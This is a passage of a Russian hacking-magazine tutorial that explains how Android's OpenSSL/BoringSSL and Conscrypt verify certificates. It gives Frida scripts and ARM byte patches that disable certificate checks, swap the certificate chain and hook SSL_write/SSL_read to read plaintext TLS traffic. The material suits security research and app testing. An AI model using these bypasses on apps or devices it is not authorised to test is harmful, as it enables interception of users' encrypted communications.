каем новоиспеченное приложение и сра зу же заглядываем в разметку его
памяти.




          Ищем следы OpenSSL в приложениях для Android


В поисках истины
Становится  очевидно,  что  в  Android  есть биб лиотека,  которая  ведет
к OpenSSL. Но загрузилась она не из‐за использования HTTPS, а задолго
до появления на экране основного приложения — на этапе «конструиро‐
вания» процесса приложения (fork из app_process) и проверки его под‐
линности. Это связано с особен ностями рас пространения приложе ний
для Android, в которые мы погружаться не будем.
   Чтобы убедиться, что найденная биб лиотека свя зана с OpenSSL, можно
посмотреть ее таблицу символов и затем сравнить с при митивами эталонной
openssl. Получить ее мож но, нап ример, компиляцией исходников из офи‐
циального репозитория OpenSSL. Самое время убедиться, не используется
ли рутина libssl.so, когда пользователь нажимает кнопки в нашем приложе‐
нии.


             INFO

                     Библиотека libssl на Android — это не OpenSSL
                        в чистом виде. Эта ОС сде лана в Google, а у
                       Google   почти  на   все   есть  свой   форк.
                     Для OpenSSL — это BoringSSL, о котором уже
                       писали в том числе в «Хакере».


Наконец мы подошли к реализации потенциала нашего приложения — обна‐
ружению в используемом им клиенте (OkHttp) на более низком уровне следов
«классического клиента TLS».
   Если мы изучим функции, которые экспортиру ет libssl, то увидим среди них
все те, что задействованы в клас сичес ком клиенте в примере выше. Поэтому
проще всего искать следы, если сформировать стек вызовов всех известных
(то есть экспортируемых) нам функций, когда поль зователь нажимает на пер‐
вую  кнопку  тестового приложения. Вот  получившийся фрагмент  сте ка
вызовов до момента проведения рукопожатия при клике на кнопку:


TLS_server_method
SSLv23_client_method
SSLv23_method
TLS_method
TLS_client_method
SSLv23_server_method
(*) SSL_CTX_new
(*) SSL_CTX_set_options
SSL_CTX_set_mode
SSL_CTX_set_cert_verify_callback
SSL_CTX_set_info_callback
SSL_CTX_set_cert_cb
SSL_CTX_set_signing_algorithm_prefs
SSL_CTX_set_session_id_context
SSL_new
SSL_set_ex_data
(*) SSL_set_verify
SSL_set_renegotiate_mode
SSL_set_connect_state
SSL_enable_ocsp_stapling
SSL_get_ex_data
SSL_set_alpn_protos
SSL_set_options
SSL_clear_options
SSL_set_cipher_list
SSL_clear_options
SSL_set_tlsext_host_name
SSL_set_mode
SSL_set_fd
SSL_get_ex_data
SSL_do_handshake // рукопожатие
...

Полный стек вызовов получился внушительным. Зато он полностью покрывает
одиночный запрос HTTPS из OkHttp. Сейчас с включенным прокси‐сниф‐
фером приложение вылета ет с ошибкой:


javax.net.ssl.SSLHandshakeException: java.security.cert.CertPa
thValidatorException: Trust anchor for certification path not found.

Что не удивительно. На полученном фрагменте стека мы видим, что какие‐то
шаги классического клиента были пройдены, а какие‐то — нет. Но самое
главное, что до хендшейка не было заг рузки доверенных сертификатов! А как
известно, без этого успешного исхода хендшей ка не добиться.
  Откуда же импле мен тация OpenSSL в Android  (libssl) берет свои сер‐
тификаты? Ответ на этот вопрос кроется в функциях обратного вызова.
OpenSSL позволяет клиенту (пользователю функци оналом) пере опре делить
поведение почти на каждом этапе безопас ного соединения. Для этого
OpenSSL предлагает ряд функций, которые можно использовать для установ‐
ки своих колбэков на раз ных этапах.
  Одна из таких функций — SSL_CTX_set_cert_verify_callback, которая
засветилась в стеке вызовов. Если верить документации, то сде лать этот кол‐
бэк сможет очень многое. По сути, он целиком делегирует приложению про‐
цедуру проверки подлиннос ти сертификата сервера. Если отследить колбэк,
то это, возможно, даст ответы на воп росы об источнике доверенных сер‐
тификатов в Android.
  Настал момент воспользоваться преимуществом открытых исходников
OpenSSL и посмотреть на функцию SSL_CTX_set_cert_verify_callback
изнутри. Поиск по коду OpenSSL на GitHub быс тро выведет нас к файлу ss‐
l_lib.c:


...
void SSL_CTX_set_cert_verify_callback(SSL_CTX *ctx, int (*cb) (X509_S
TORE_CTX *, void *),void *arg)
{
  ctx‐>app_verify_callback = cb;
  ctx‐>app_verify_arg = arg;
}
...

Функция не делает ничего интерес ного — всего лишь инициализирует поля
структуры SSL_CTX: устанавлива ется адрес на функцию обратного вызова
и адрес на аргумент, который этой функции будет передан.
  По логике, если поля где‐то инициализиру ются, то где‐то они дол жны
и использоваться. Попробуем поискать, где используется кол бэк‐функция,
которая в других частях проекта представлена в коде полем app_verify_‐
callback. Поиск выведет нас к единственному месту — ssl_cert.c:


...
if (s‐>ctx‐>app_verify_callback != NULL)
  i = s‐>ctx‐>app_verify_callback(ctx, s‐>ctx‐>app_verify_arg);
else
  i = X509_verify_cert(ctx);
...





  Ищем места использования делегата по про верке сертификата
  в OpenSSL

Место использования делегата в OpenSSL — это часть функции ssl_veri‐
fy_cert_chain. Точно такое же место можно обнаружить в BoringSSL
(который и вхо дит в Android в виде  libssl) в коде функции ssl_cryp‐
to_x509_session_verify_cert_chain.
   Что же в этом коде интересного? Здесь (и только здесь) передается
управление пользовательской колбэк‐функции. Но самое главное: стало
ясно, что при отсутствии таковой (например, если не было явного вызова SS‐
L_CTX_set_cert_verify_callback)  управление передается  стандартной
функции верификации из OpenSSL, она называ ется X509_verify_cert.
  Давай теперь посмотрим, какой именно код получит управление в том слу‐
чае, если в результате работы клиента OkHttp будет установлен кол бэк. Нам
в этом поможет любой отладчик — например тот, что встроен в IDA Pro.





  Callback в Android, получа ющий управление при проверке сертификата
  сервера

Колбэк находится в библиотеке libjavacrypto. Это, как потом выяс нилось,
воплощение Java Security Provider (JCP) для Android под названием Conscrypt
c имплементацией Java Cryptography Extension (JCE). Приятная новость, ведь
буквы OSP в AOSP обоз нача ют Open Source Project!


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    УНИВЕРСАЛЬНЫЙ
           ПЕРЕХВАТ
             КАК ОБОЙТИ SSLPINNING РАЗ И НАВСЕГДА
           И ЧИТАТЬ ТРАФИК ЛЮБОГО ПРИЛОЖЕНИЯ





Определяем источники сертификатов
Так же, как и в случае с OpenSSL, поищем исходники Conscrypt в AOSP и мес‐
то, похожее по структуре на то, которое нам удалось найти с помощью встро‐
енного отладчика. Таким местом оказыва ется функция cert_verify_call‐
back в файле native_crypto.cc.
  Посмотри, насколь ко структура этой функции похожа на псевдокод, сге‐
нерированный плагином Hex‐Rays:


static ssl_verify_result_t cert_verify_callback(SSL* ssl, CONSCR
YPT_UNUSED uint8_t* out_alert) {
  AppData* appData = toAppData(ssl);
  JNIEnv* env = appData‐>env;
  if (env == nullptr) {
    return ssl_verify_invalid;
  }
  ScopedLocalRef<jobjectArray> array(env, CryptoBuffersToObjectArray(
env, SSL_get0_peer_certificates(ssl)));
  if (array.get() == nullptr) {
    return ssl_verify_invalid;
  }
  jobject sslHandshakeCallbacks = appData‐>sslHandshakeCallbacks;
  jclass cls = env‐>GetObjectClass(sslHandshakeCallbacks);
  jmethodID methodID = env‐>GetMethodID(cls, "verifyCertificateChain"
, "([[BLjava/lang/String;)V");
  const SSL_CIPHER* cipher = SSL_get_pending_cipher(ssl);
  const char* authMethod = SSL_CIPHER_get_kx_name(cipher);
  jstring authMethodString = env‐>NewStringUTF(authMethod);
  env‐>CallVoidMethod(sslHandshakeCallbacks, methodID, array.get(),
authMethodString);
  env‐>DeleteLocalRef(authMethodString);
  ssl_verify_result_t result = env‐>ExceptionCheck() ? ssl_ve
rify_invalid : ssl_verify_ok;
  return result;
}

Что делает найден ная нативная функция? Она, получив ссылку на объ ект SSL,
олицетворяющий экземпляр безопасного соединения, получает через него
цепочку сертификатов сервера и переда ет ее в Java‐метод с кричащим наз‐
ванием verifyCertificateChain.
   Если этот метод в про цессе своей работы не бросает исключения, то
результат верификации пос ле переда чи управления кол бэку (result) будет
успешным (ssl_verify_ok). У метода verifyCertificateChain в свою оче‐
редь есть ряд реализаций в Conscrypt, и все они очень‐очень похожи:


public void verifyCertificateChain(byte[][] certChain, String authMe
thod) throws CertificateException {
  try {
    if (certChain == null || certChain.length == 0) {
      throw new CertificateException("Peer sent no certificate");
    }
    X509Certificate[] peerCertChain = SSLUtils.decodeX509Certi
ficateChain(certChain);


    X509TrustManager x509tm = sslParameters.getX509TrustManager();
    if (x509tm == null) {
      throw new CertificateException("No X.509 TrustManager");
    }


    activeSession.onPeerCertificatesReceived(getPeerHost(), getPee
rPort(), peerCertChain);


    if (getUseClientMode()) {
      Platform.checkServerTrusted(x509tm, peerCertChain, authMethod,
this);
    } else {
      String authType = peerCertChain[0].getPublicKey().getAlgorithm
();
      Platform.checkClientTrusted(x509tm, peerCertChain, authType,
this);
    }
  } catch (CertificateException e) {
    throw e;
  } catch (Exception e) {
    throw new CertificateException(e);
  }
}

Важнее всего то, что мы наконец‐то нашли источник доверенных сертифика‐
тов в Android. Как видно, проверка цепочки сертифика тов основана на экзем‐
пляре класса X509TrustManager. По умолчанию используется дефол тный
TrustManager. Источники его доверенных сертификатов было достаточно
просто отследить уже на уровне Java. В конечном счете мы при дем к клас су
TrustedCertiﬁcateStore, где содержится логика инициализации источников
доверенных сер тификатов:


...
String ANDROID_ROOT = System.getenv("ANDROID_ROOT");
String ANDROID_DATA = System.getenv("ANDROID_DATA");
CA_CERTS_DIR_SYSTEM = new File(ANDROID_ROOT + "/etc/security/cacerts"
);
CA_CERTS_DIR_ADDED = new File(ANDROID_DATA + "/misc/keychain/
cacerts‐added");
CA_CERTS_DIR_DELETED = new File(ANDROID_DATA + "/misc/keychain/
cacerts‐removed");
...

Получается, что загрузка доверенных сертификатов не производится непос‐
редственно в OpenSSL. Вмес то этого всю рутину по проверке цепочки сер‐
тификатов берет на себя функция обратного вызова из Java. Ее во время
работы по умолчанию использует тот TrustManager, который загружает сер‐
тификаты из системных папок.
   Теперь мы точно знаем об источнике доверенных сертификатов, которые
OpenSSL получает при использовании клиента OkHttp. А также обо всей
цепочке вызовов, происходящих в ходе установки безопасного соединения
в реальной среде, эксплу атирующей OpenSSL, — Android.


HTTPS КАК СРЕДСТВО ЗАЩИТЫ ОТ ПОЛЬЗОВАТЕЛЯ
Подавляющее боль шинство «клас сических» клиентов HTTPS использует сис‐
темное хранилище сертификатов. Главный недос таток такого подхода —
в полном доверии сертификатам из пап ки устройства. Это значит, что
какие бы сертификаты ни находились в хра нилище у пользователя, они прой‐
дут проверку подлиннос ти, и соединение будет успешно установлено. Таким
сертификатом может быть сертификат прокси‐сервера, что при ведет клас‐
сическую схему к несколь ко дру гому виду: она будет с «двойным рукопожати‐
ем».





   Схема установки SSL‐соединения через «доверенный» прокси‐сервер

По  идее,  для защиты  от MITM  пользователь дол жен самос тоятельно
заботиться о содержимом сво их системных хранилищ. Но что, если он сам
пожелает посмотреть, чем приложение обме нива ется с сервером? Здесь
на помощь приходит технология SSLPinning.
   Суть «пининга» донель зя простая: вместо того, чтобы доверять системным
сертификатам из хранилища устройства, доверие гарантируется только одно‐
му сертификату — сертифика ту сервера, с которым происходит обмен дан‐
ными.
  Механизм такого доверия предполага ет, что часть информации о сер‐
тификате сервера понадобится зашить в код проверки. Обычно это хеш SHA‐
сертификата, именуемый «пином». В нашем тестовом приложении исполь‐
зовал ся хеш SHA‐256, который переда ется при ини циализации OkHttp.
   Есть ряд популярных подходов к реализации SSLPinning в приложениях.
Один из них, как мы знаем, реализуется биб лиотекой OkHttp. Для большинс‐
тва этих способов есть контрприемы: в виде скриптов Frida, системных
модулей или, на худой конец, просто описаний алгоритмов обхода.
  Однако проблема сос тоит в том, что раз работчики могут делать свои под‐
ходы к защите от пользователя. Помеша ют здесь раз ве что лень и нежелание
разбираться в OpenSSL. Каждый раз с нуля начинать обход — неб лагодарное
занятие. Как можно упростить себе жизнь?


ОБХОДИМ SSLPINNING
Настало время исполь зовать полученные нами сведения о работе OpenSSL
и приготовить универ сальный способ перехвата трафика HTTPS в любых при‐
ложениях, где сетевое взаимо действие основано на OpenSSL.


Спо соб первый: глу шим про верки OpenSSL
Первый метод, претендующий на звание уни версального, будет основан
на только что иссле дованном нами алго ритме взаимодействия с библиоте кой
OpenSSL — с помощью функций обратно го вызова. Мы можем с уве рен‐
ностью предположить, что их использование — это самый простой способ
обратиться к OpenSSL.
  Нам уже известен «толстый» callback, который пользователь устанавлива‐
ет для переопределе ния процедуры проверки цепочки сертификатов. За это
отвечает функция SSL_CTX_set_cert_verify_callback, а используется этот
колбэк в ssl_verify_cert_chain следующим обра зом:


if (s‐>ctx‐>app_verify_callback != NULL)
  i = s‐>ctx‐>app_verify_callback(ctx, s‐>ctx‐>app_verify_arg);
else
  i = X509_verify_cert(ctx);

Как мы это можем использовать? Самым пра виль ным вариантом будет «глу‐
шение» пользовательско го колбэка. Для этого дос таточно нарушить условие
s‐>ctx‐>app_verify_callback != NULL, то есть сделать так, чтобы ap‐
p_verify_callback был NULL. Что бы это произош ло, нужно отменить эффект
вызова SSL_CTX_set_cert_verify_callback, при чем желательно  внутри
самой функции.
  Для проверки этой теории легче всего будет модифицировать копии биб‐
лиотеки напрямую в памяти работа ющего процесса, чтобы изменения влияли
только на него. Самый удобный из инстру ментов, которые поз воляют такое
сделать, — это, пожалуй, Frida. Вот как с ее помощью будет уничтожен колбэк
(затираем первый аргумент нулем):


if(e.name == "SSL_CTX_set_cert_verify_callback"){
  Interceptor.attach(e.address, {
    // 0x0 == NULLptr
    onEnter: function(args){ args[1] = ptr("0x0") },
    onLeave: function(retval){}
  });
}

Далее остается решить, что делать с частью else. Когда происходит вызов
X509_verify_cert, управление переда ется в x509_vfy.c. Функция производит
много действий, часть из которых полага ется на то, что OpenSSL будет про‐
инициализирован хранилищем сертифика тов.
   Весь список проверок нам просто так не пройти, поэтому легче будет заг‐
лушить и эту функцию. Секция else в ассемблерном эквивален те libssl (x64)
представ ляет следующее:


.text:00000000000291C4   MOV   X0, SP
.text:00000000000291C8   BL    .X509_verify_cert

Здесь же выясняется, что успешное с точки зрения проверки цепочки сер‐
тификатов возвращаемое значение X509_verify_cert — это 1 (true). В ARM
возврат значения происходит через регистры R0‐R3. В нашем же случае все
сводится к регистру R0, пос кольку тип воз вра щаемого значения прост. Поп‐
робуем перезаписать этот код имитацией успешной отработки X509_veri‐
fy_cert (заодно не забыва ем и про устра нение аргумента функции):


.text:00000000000291C4   MOV   X0, #1
.text:00000000000291C8   MOV   X0, #1

Для реализации этого нужно напрямую записать в память 8 байт машинного
кода (два раза по 4 байта, пос кольку 4 бай та — фиксированный размер инс‐
трукции в ARM). Конвертацию в машкод произведем с помощью rasm
из пакета утилит radare2:


$ rasm2 ‐a arm ‐b 64 'MOV X0, 0x1'
200080d2

Прибегаем к Frida для завершения операции глушения:


Memory.protect(libsslx64Module.base.add(0x291C4), 8, 'rwx');
Memory.writeByteArray(libsslx64Module.base.add(0x291C4), [0x20,0x00,
0x80,0xd2,0x20,0x00,0x80,0xd2])

И в итоге добиваемся успешного прохождения всех низкоуровневых про‐
верок  в  ssl_verify_cert_chain  (их  глушения). Два  наших  действия
в результате привели к тому, что теперь у нас есть воз можность под слу‐
шивать HTTPS, работающий в «штатном» режиме (без защиты SSLPinning)
и без импорта сертификатов из системного хранилища. Нажатие на первую
кнопку тестового приложения теперь при водит не к исключительной ситуации
SSLHandshakeException, а к тому, что ты видишь на картинке.





  Пара простых операций на нижнем уровне OpenSSL дала определенные
  плоды

Однако при нажатии на вто рую кнопку тестового приложения («Do Https with
pin!») перехватывать тра фик пока все еще не получается, что наводит
на мысль о дополнительных проверках. Давай же узнаем, что это за проверки!





          Какая‐то часть приложения нам все еще не доверя ет


По иск места допол нительной про верки сертификатов
Если продолжить дампить стек вызовов функций OpenSSL после нажатия
на кнопку приложения, то можно понять, что на уровне libssl все проверки
прошли успешно. Это спровоцировало дальнейшую последовательность
действий:


...
SSL_do_handshake
SSL_is_dtls
SSL_get_session
SSL_in_init
SSL_SESSION_dup
SSL_SESSION_free
SSL_get_ex_data
SSL_SESSION_free
SSL_get1_session
SSL_in_init
SSL_get_certificate
SSL_get_peer_full_cert_chain
...

Особенно интересны последние два вызова. Пос ле успешно подделанного
рукопожатия нечто пытается получить отправленную сервером цепочку сер‐
тификатов... и получает. Это значит, что чем бы ни было нечто, оно может
перепроверить результат отра бот ки нативной функции OpenSSL, которую мы
только что прооперировали.
  Выходит, OpenSSL хранит полученные от сервера сертификаты и может
отдать их по пер вому требова нию на любом этапе безопас ного соединения.
Это не подходит нам, ведь суть SSLPinning и заключается в пристальной про‐
верке  сертификата,  поэто му  попробуем  выяс нить,  как  это  побороть.
Для начала посмотрим на исходник SSL_get_peer_full_cert_chain:


STACK_OF(X509) *SSL_get_peer_full_cert_chain(const SSL *ssl) {
  check_ssl_x509_method(ssl);
  SSL_SESSION *session = SSL_get_session(ssl);
  if (session == NULL) {
    return NULL;
  }
  return session‐>x509_chain;
}

Функция возвращает ссылку на кастомный тип данных — STACK_OF(X509).
OpenSSL использует Stack API для удоб ного вза имодействия с коллекциями
объектов. Цепочка сертифика тов является, по сути, стеком. Если посмотреть
представ ление этой структуры данных в памяти, то можно обнаружить, что
указатель на стек сертифика тов находится во втором поле этой структуры
(размер указате ля составляет 8 байт):



             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
  00000000  02 00 00 00 00 00 00 00 80 55 cb 54 7f 00 00 00  .........U.T....
  00000010  00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  ................
  00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................


По указателю друг за дру гом хранятся ссылки на экземпляры структуры X509
(в цепочке два сертифика та):



             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
  00000000  00 fe fd 57 7f 00 00 00 00 b1 f8 57 7f 00 00 00  ...W.......W....
  00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................


Получается,  для  того  чтобы  окончательно  заглушить OpenSSL,  нужно
каким‐то образом подменить получа емую цепочку сертификатов на ту, что
ожидает приложение. А для это го надо деталь но изу чить структуру X509
и воссоздать заполненный ее экземплярами стек с доверенными сертифика‐
тами в памяти работающего про цес са.
  Однако в ходе исследова ния я нашел одну интересную особенность
работы OpenSSL, которая поз воляет существенно упростить подделку цепоч‐
ки. Дело в том, что после уста новки и закрытия соединения структура данных
STACK_OF(X509) не уда ляет ся из памяти (память не очищается, хотя ссылки
на нее могут и исчезнуть). Это поз воляет заново использовать ее в пос леду‐
ющих соединениях, пока занятая ранее память не будет выделе на под что‐то
еще.
  Заново использовать память мы будем следующим образом. Первое
соединение по HTTPS будет уста новлено без прокси‐сниффера, а последу‐
ющие — через него. Это позволит получить валидную цепочку сертификатов
при первом соединении, запомнить ссылку на нее и затем воз вращать эту
ссылку во всех последующих соединениях.
  Важно отметить, что вся низкоуровневая рутина по генерации сессионных
клю чей для шифрования трафика (сим метричным шифром) будет происхо‐
дить где‐то в недрах OpenSSL. Там будет присутствовать нас тоящий сер‐
тификат, получен ный от прокси, а вот на уровне выше — там, где происходит
дополнительная проверка сертификата, — будет уже поддельная доверенная
цепочка.


Устранение «лиш них» перепроверок сертификата
В недрах OpenSSL функция SSL_get_peer_full_cert_chain не использует‐
ся, поэтому можно безопасно заняться ее модификацией. Для проведения
такой модификации нужно будет следить за тем, какую цепочку возвращает
функция, а это возможно только с помощью чтения полей структур X509.
Структура выглядит следующим образом:


struct x509_st
{
  X509_CINF *cert_info;
  X509_ALGOR *sig_alg;
  ASN1_BIT_STRING *signature;
  CRYPTO_refcount_t references;
  char *name;
  CRYPTO_EX_DATA ex_data;
  ...
} /* X509 */;

Наиболее простое и интересное поле, по которому можно было бы отличать
плохие цепочки сертификатов от хороших, — это name. Здесь хранится тек‐
стовый идентификатор сертифика та. Вот, например, что содержит это поле
в первом сертификате из цепочки при двух разных сценариях в момент обра‐
щения к google.com:


// При активном прокси Burp Suite
/C=PortSwigger/O=PortSwigger/OU=PortSwigger CA/CN=google.com
// Без прокси
/C=US/ST=California/L=Mountain View/O=Google LLC/CN=*.google.com

Теперь у нас достаточ но информа ции, чтобы реализовать задуманное. Снова
обращаемся за помощью к фреймворку Frida для модификации памяти. Сле‐
дующий фрагмент описывает завершающий пазл глу шения OpenSSL:


// указатель на запомненную «хорошую» цепочку
VALID_CERT_CHAIN = 0;
if(e.name == "SSL_get_peer_full_cert_chain"){
  Interceptor.attach(e.address, {
    onEnter: function(args){},
    onLeave: function(retval){
      // ссылка на стек структур X509
      var stackDataPtr = Memory.readPointer(retval.add(8))
      // ссылка на первый в стеке сертификат X509
      var firstX509StructPtr = Memory.readPointer(stackDataPtr.add(0)
)
      // ссылка на поле name первого сертификата — пятое поле в
структуре
      var firstX509Struct_fieldNamePtr = Memory.readPointer(firstX
509StructPtr.add(8*4));
      // значение поля name первого сертификата
      var firstX509Struct_fieldName = Memory.readCString(firstX
509Struct_fieldNamePtr)
      // открываем путь для Burp Suite!
      if(firstX509Struct_fieldName.indexOf("PortSwigger") > ‐1 &&
VALID_CERT_CHAIN != 0){
        retval.replace(VALID_CERT_CHAIN)
      }
      else{
        VALID_CERT_CHAIN = ptr(retval.toString())
      }
    }
  });
}

Результат не заставляет себя долго ждать: выполняем первый запрос и вклю‐
чаем Burp. Весь осталь ной тра фик теперь совершенно беспрепятственно
будет проходить перед нашими глазами.





                          SSLPinning bypassed!


             INFO

                    Ин тересно, что SSLPinning на уровне введенного
                        в Android 7 Network security conﬁguration лег ко
                       обходится и без подмены цепочки сертифика‐
                        тов — достаточно заглушить callback.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    УНИВЕРСАЛЬНЫЙ
           ПЕРЕХВАТ
             КАК ОБОЙТИ SSLPINNING РАЗ И НАВСЕГДА
           И ЧИТАТЬ ТРАФИК ЛЮБОГО ПРИЛОЖЕНИЯ





Спо соб вто рой: игно риру ем про верки OpenSSL
Если немного подумать над способами универсального обхода, возникает
логичный вопрос: а нужно ли вооб ще обходить SSLPinning? Очевидно, что
без вмешательства в процесс хендшейка при установке соединения все пос‐
ледующие передачи полезной нагрузки будут происходить без каких‐либо
проверок: данные просто будут литься в сокет SSL.
  Конечно, дан ные эти будут зашиф рованы, но в OpenSSL должно быть
такое место, где можно однозначно отследить превращение незашифрован‐
ных данных в зашифрованные. Попробуем подслушать трафик без прок‐
си‐сниффера.


Забираем полез ные дан ные до отправки
Продолжим дальше изучать пример демонстрацион ного клиента TLS, взятого
в wiki.openssl. Замечаем, что пос ле успешного рукопожатия с сервером кли‐
ент начинает отправку полезных данных:


...
BIO_puts(web, "GET " HOST_RESOURCE " HTTP/1.1\r\n"
              "Host: " HOST_NAME "\r\n"
              "Connection: close\r\n\r\n");
BIO_puts(out, "\n");
...

Функция BIO_puts в какой‐то степени говорит сама за себя. Но все не так
просто, как кажется. Это сво его рода абстракция OpenSSL над I/O. Если нем‐
ного погуглить, то выясняется, что таких функций целая группа, синонимичная
функциям на C. Одна из них — BIO_write, она выполняет в целом то же, что
и BIO_puts. Кроме функций абстракции BIO в OpenSSL есть и другие фун‐
кции  для  выпол нения  I/O. Самые  интересные  для  нас —  это  пара
SSL_write/SSL_read.
  Возникает вопрос: зачем в OpenSSL столько раз ных функций? Оказыва‐
ется, две эти группы дополняют друг дру га: OpenSSL опе рирует буферами
байтов, которые перед попаданием в сокет на клиенте дол жны шифроваться,
а до того они помещаются в специальный буфер. Операция сохранения бай‐
тов в этот спе циальный буфер производится с помощью SSL_write, а опе‐
рация превращения их в шифрованный буфер — с помощью BIO_read.
  Для операции чтения ситуация симметричная: прочитанные с сокета бай‐
ты записываются в специальный буфер с помощью BIO_write, после чего
можно получить открытый текст с помощью SSL_read. Таким образом, откры‐
тый текст мы можем получать на вхо де SSL_write при чтении исходяще го
трафика и на выходе SSL_read для входящего тра фика. Вот говорящие сиг‐
натуры SSL_write и SSL_read:


int SSL_write(SSL *ssl, const void *buf, int num)
int SSL_read(SSL *ssl, void *buf, int num)

А вот пример снятия трафика в SSL_write после успешного хендшейка c
google.com (по бинарному HTTP/2) под защитой SSLPinning:



             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
  00000000  50 52 49 20 2a 20 48 54 54 50 2f 32 2e 30 0d 0a  PRI * HTTP/2.0..
  00000010  0d 0a 53 4d 0d 0a 0d 0a 00 00 00 00 00 00 00 00  ..SM............
  00000020  00 00 06 04 00 00 00 00 00 00 04 01 00 00 00     ................


И ответ из SSL_read:



             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
  00000000  00 00 00 00 01 00 00 00 03 3c 48 54 4d 4c 3e 3c  .........<HTML><
  00000010  48 45 41 44 3e 3c 6d 65 74 61 20 68 74 74 70 2d  HEAD><meta http‐
  00000020  65 71 75 69 76 3d 22 63 6f 6e 74 65 6e 74 2d 74  equiv="content‐t
  00000030  79 70 65 22 20 63 6f 6e 74 65 6e 74 3d 22 74 65  ype" content="te
  00000040  78 74 2f 68 74 6d 6c 3b 63 68 61 72 73 65 74 3d  xt/html;charset=
  00000050  75 74 66 2d 38 22 3e 0a 3c 54 49 54 4c 45 3e 33  utf‐8">.<TITLE>3
  00000060  30 31 20 4d 6f 76 65 64 3c 2f 54 49 54 4c 45 3e  01 MovedTITLE>
  00000070  3c 2f 48 45 41 44 3e 3c 42 4f 44 59 3e 0a 3c 48  HEAD><BODY>.<H
  00000080  31 3e 33 30 31 20 4d 6f 76 65 64 3c 2f 48 31 3e  1>301 MovedH1>
  00000090  0a 54 68 65 20 64 6f 63 75 6d 65 6e 74 20 68 61  .The document ha
  000000a0  73 20 6d 6f 76 65 64 0a 3c 41 20 48 52 45 46 3d  s moved.<A HREF=
  000000b0  22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 67 6f 6f  "https://www.goo
  000000c0  67 6c 65 2e 63 6f 6d 2f 22 3e 68 65 72 65 3c 2f  gle.com/">here</
  000000d0  41 3e 2e 0d 0a 3c 2f 42 4f 44 59 3e 3c 2f 48 54  A>...BODY>HT
  000000e0  4d 4c 3e 0d 0a 00 00 00 00 00 00 00 00 00 00 00  ML>.............


Получать дамп именно здесь удобно еще и потому, что мы можем разделить
весь трафик между параллельными соеди нениями. Сделать это можно
с помощью первого параметра, который есть в обеих функциях, — указателя
на соединение. А различать, например, само зна чение указателя.


Забираем полез ные дан ные до шифрования
На практике часто оказывается, что разработчики, зашивая в свои приложе‐
ния OpenSSL в том или ином виде (как пра вило, путем статической ком‐
пиляции либо путем перено са части исходников из проекта OpenSSL),
не полагаются на SSL_write. Это выз вано тем, что SSL_write реализует
целый пласт вспомогательной логики, которую нередко переопределяют
при кастомной импле ментации сетево го стека.
   Это приводит к тому, что в соб ранных приложениях присутс твует семей‐
ство функций I/O из OpenSSL, но используются они по минимуму — либо
не используются вовсе. Но есть и при ятная новость: если раз работчики,
внедряющие в свои проекты OpenSSL, час тенько и избегают прямого
использования сетевой логики в виде SSL_write, то без криптографической
составляющей OpenSSL обойтись уже слож нее. Как минимум потому, что
алгоритмы шифрования остаются неизменными даже при имплементации
собственного сетево го стека. Раз работка же собс твенного криптографичес‐
кого алгоритма чревата появлением дополнительного источника ошибок.
  По ряду причин весь OpenSSL разделен на две большие части: уже рас‐
смотренная libssl, где реализова на рутина для протоколов SSL/TLS, и libcryp‐
to — с криптографическими алго ритмами. Первая зависит от второй, а вот
вторая библиотека пол ностью авто номна. Если заглянуть в таблицу символов
not‐stripped‐версии libcrypto, то можно увидеть много инте ресного.





        Внутренности криптогра фической составляющей OpenSSL

Библиотека предоставляет доступ к огромно му числу криптографических
функций. Нас в первую очередь интересуют алгоритмы симметричного блоч‐
ного шифрования. У протокола TLS есть одна неоче видная особенность:
асимметричная криптогра фия работа ет только на этапе выработки общего
клю ча между клиентом и сервером. Дальше этот ключ будет использоваться
для шифрования полезной нагрузки одним из симметричных шифров.
   Алгоритм для симметричного шифрования и метод выработки общего
клю ча определяется на эта пе хендшейка: сервер и клиент обмениваются друг
с другом наборами криптографичес ких возможностей, которые они под‐
держивают. Такие наборы называются СipherSuites. Они бывают разными,
ознакомиться  с  их  вариантами можно  в официальной  документации
OpenSSL.


             INFO

                       Узнать о выб ранном CipherSuite всег да можно
                       путем   перехвата   пакетов   TCP,   например
                        с помощью Wireshark. Однако иногда встречают‐
                        ся экзотические шифронаборы, которые не уда‐
                        ется определять в авто матическом режиме. Тут
                      поможет таблица их кодов.


Зачем нам знать о CipherSuites? Дело в том, что от выбранного набора
зависит диапазон исполь зуемых функций libcrypto.
  Например, если сервер и клиент договорились (последнее слово тут
за сервером) использовать для шифрования AES в режиме CBC, то в наз‐
ваниях функций из libcrypto обязательно будут буквы aes и cbc. На практике
наиболее часто встречается шифронабор AES в режиме GCM с длиной ключа
в 128 бит (TLS_RSA_WITH_AES_128_GCM_SHA256), за работу которого в libcryp‐
to отвечает такая связка:


int CRYPTO_gcm128_encrypt_ctr32(GCM128_CONTEXT *ctx,
  const void *key, const uint8_t *in, uint8_t *out, size_t len,
  ctr128_f stream);
int CRYPTO_gcm128_decrypt_ctr32(GCM128_CONTEXT *ctx,
  const void *key, const uint8_t *in, uint8_t *out, size_t len,
  ctr128_f stream);

Перехват буфера in в первом случае и out во втором позволит получить то
же содержимое,  что мы перехватили при  стандартном использовании
OpenSSL — с помощью SSL_write и SSL_read. Главная причина здесь в том,
что с момента, как буфер попал в SSL_write/SSL_read, он никак не меняется
до шифрования или дешифровки в BIO_read/BIO_write.
  Во многих других шифронабо рах при симметричном шифровании внутри
libcrypto используется высокоуровневый интерфейс криптографичес ких фун‐
кций OpenSSL — EVP (EnVeloPe). Через него можно получать доступ к крип‐
тографии, абстрагируясь от конкретного алгоритма и режима его функциони‐
рования. При таком сценарии, веро ятнее всего, будут сделаны вызовы
EVP_DecryptUpdate/EVP_EncryptUpdate. Их перехват приведет к аналогич‐
ному результату:


int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out,
  int *outl, const unsigned char *in, int inl);
